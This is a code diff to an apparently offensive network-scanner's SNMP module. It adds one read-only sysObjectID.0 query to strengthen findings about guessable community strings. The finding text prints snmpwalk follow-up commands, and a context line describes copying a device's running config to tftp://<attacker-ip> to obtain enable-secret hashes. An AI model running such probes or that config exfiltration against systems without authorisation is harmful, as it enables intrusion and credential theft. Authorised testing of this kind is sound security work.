@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import socket
 
+from ..core import proxy
 from ..core.models import Account, Host, Port
 from .svccommon import finding_builder
 
@@ -514,6 +515,52 @@ def _cmdline_looks_credful(param: str) -> bool:
     return False
 
 
+# --- T2 SAFE evidence: one controlled read of a distinct MIB variable ----------
+# The T1 signal is "sysDescr GET returned a value" - a truthy probe ACK. T2
+# wants concrete server-side evidence in the finding output. We do ONE additional
+# GET on sysObjectID.0 (RFC 1213 §6.4.2, the immutable vendor/enterprise OID),
+# a single UDP round-trip, bounded by proxy-scaled timeout, no writes, no state
+# change. Two distinct MIB variables read without credentials => arbitrary unauth
+# MIB read is proven, not just a probe-ACK.
+_T2_EVIDENCE_TIMEOUT_MIN = 2.0
+_T2_EVIDENCE_TIMEOUT_MAX = 6.0
+_T2_EVIDENCE_REQUEST_ID = 11000
+
+
+def _t2_bounded_timeout(timeout: float) -> float:
+    """Clamp base timeout to 2-6s, then scale for proxy latency (proxy.scaled)."""
+    base = max(_T2_EVIDENCE_TIMEOUT_MIN, min(_T2_EVIDENCE_TIMEOUT_MAX, timeout))
+    return proxy.scaled(base)
+
+
+def capture_v2c_read_evidence(sock, ip: str, port: int, community: str,
+                              timeout: float,
+                              request_id: int = _T2_EVIDENCE_REQUEST_ID
+                              ) -> dict | None:
+    """T2 SAFE proof: one controlled GET on sysObjectID.0.
+
+    Returns {'oid': 'sysObjectID.0', 'value': '<enterprise oid>'} when the
+    agent replies with a valid OID (RFC 1213 §6.4.2 defines sysObjectID as an
+    immutable OBJECT IDENTIFIER identifying the vendor and model). Returns
+    None on timeout, parse failure, or any non-OID reply - never raises. No
+    writes, no state change.
+    """
+    if not community:
+        return None
+    try:
+        vb = _get(sock, ip, port, community, _SYS_OBJECTID,
+                  _t2_bounded_timeout(timeout), request_id)
+    except OSError:
+        return None
+    if not vb:
+        return None
+    _oid, val = vb[0]
+    # Value must be a valid, non-empty OID string ("1.3.6.1.4.1.<enterprise>.<...>").
+    if not isinstance(val, str) or not val or "." not in val:
+        return None
+    return {"oid": "sysObjectID.0", "value": val}
+
+
 def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
           known_open: bool = False) -> dict | None:
     """Find a readable community, then read the system group + walk the high-value
@@ -541,6 +588,14 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
             return None
         out = {"ip": ip, "port": port, "community": community,
                "rw_likely": community in _RW_LIKELY, "sys_descr": sys_descr or ""}
+        # T2 SAFE evidence capture: one controlled GET on a distinct MIB variable
+        # (sysObjectID.0). Non-destructive, single-shot, bounded timeout. When
+        # present it promotes snmp_community from T1 -> T2 with captured
+        # server-side evidence in the finding output. Never raises; on any
+        # failure the finding stays T1 with its existing evidence.
+        evidence = capture_v2c_read_evidence(sock, ip, port, community, timeout)
+        if evidence is not None:
+            out["v2c_read_evidence"] = evidence
         # v3 discovery runs regardless: many agents accept v2c AND expose v3.
         v3 = snmpv3_discover(ip, port, timeout)
         if v3 is not None:
@@ -643,13 +698,46 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             ip, port = pr["ip"], pr["port"]
             tgt = f"{ip}:{port}"
             ident = "; ".join(x for x in (pr.get("sys_name"), pr.get("sys_descr")) if x)
-            out.append(_finding(
-                "high" if pr.get("rw_likely") else "medium",
-                "SNMP readable with a guessable community string", tgt,
+            # T2 SAFE proof: captured server-side evidence from one controlled
+            # GET on sysObjectID.0 (distinct from the sysDescr sanity read that
+            # discovered the community). Two distinct MIB variables read without
+            # credentials proves arbitrary unauth MIB read - not just a probe
+            # ACK. When present, promotes the RO finding T1 -> T2. The RW
+            # variant stays T1 because a true T2-for-RW would require an actual
+            # SET (destructive, out of scope).
+            evidence = pr.get("v2c_read_evidence") or {}
+            detail = (
                 f"Community '{pr['community']}' returns SNMP data unauthenticated"
                 + (f" - {ident}." if ident else ".")
                 + (" This community name is conventionally read-WRITE (recce did NOT "
-                   "send a SET; verify the access level)." if pr.get("rw_likely") else ""),
+                   "send a SET; verify the access level)." if pr.get("rw_likely") else ""))
+            if evidence and not pr.get("rw_likely"):
+                # Two-varbind server-side evidence (sysDescr from community
+                # brute + sysObjectID.0 from the follow-on canary GET). The
+                # captured value is the vendor's enterprise OID under
+                # 1.3.6.1.4.1.<enterprise>.<...> (RFC 1213 §6.4.2).
+                sd = (pr.get("sys_descr") or "").strip().replace("\n", " ")[:180]
+                detail += (
+                    f"\n\nT2 proof - captured server-side evidence "
+                    f"(two distinct MIB reads over one community):\n"
+                    f"    community: {pr['community']!r}\n"
+                    f"    sysDescr.0: {sd!r}\n"
+                    f"    {evidence.get('oid', 'sysObjectID.0')}: "
+                    f"{evidence.get('value', '')}\n"
+                    f"Two RFC 1213 system-group variables retrieved without "
+                    f"credentials via GET-request-id-correlated GET replies "
+                    f"- unauthenticated arbitrary MIB read is confirmed, not "
+                    f"just a probe ACK.")
+            if pr.get("rw_likely"):
+                depth_tier = "t1"
+            elif evidence:
+                depth_tier = "t2"
+            else:
+                depth_tier = ""
+            out.append(_finding(
+                "high" if pr.get("rw_likely") else "medium",
+                "SNMP readable with a guessable community string", tgt,
+                detail,
                 "snmpwalk / snmp-check",
                 f"snmpwalk -v2c -c {pr['community']} {ip}   # or snmp-check {ip} "
                 f"-c {pr['community']}",
@@ -663,7 +751,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "--config-copy tftp://<attacker-ip>/run.cfg — running-config "
                     "lands with 'enable secret' hashes."
                 ) if pr.get("rw_likely") else "",
-                depth_tier="t1" if pr.get("rw_likely") else ""))
+                depth_tier=depth_tier))
             if pr.get("users"):
                 names = ", ".join(pr["users"][:15])
                 out.append(_finding(
